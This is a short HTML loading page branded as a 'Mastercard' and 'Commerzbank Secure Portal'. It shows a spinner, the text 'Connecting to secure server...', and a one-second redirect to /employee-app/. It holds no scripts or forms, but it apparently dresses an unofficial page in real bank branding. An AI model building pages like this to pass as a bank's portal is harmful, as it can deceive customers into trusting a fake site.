<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="1;url=/employee-app/">
    <title>Mastercard Commerzbank</title>
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/349/349221.png">
    <style>
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            text-align: center;
            padding: 40px;
            border: 2px solid #ffcc00;
            border-radius: 15px;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
        }
        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #ffcc00;
            letter-spacing: 3px;
        }
        .sub {
            font-size: 14px;
            color: #ccc;
            margin-top: 10px;
        }
        .loader {
            margin-top: 20px;
            width: 50px;
            height: 50px;
            border: 3px solid #ffcc00;
            border-top: 3px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">💳 MASTERCARD</div>
        <div class="sub">Commerzbank Secure Portal</div>
        <div class="loader"></div>
        <p style="font-size:12px; color:#666;">Connecting to secure server...</p>
    </div>
</body>
</html>
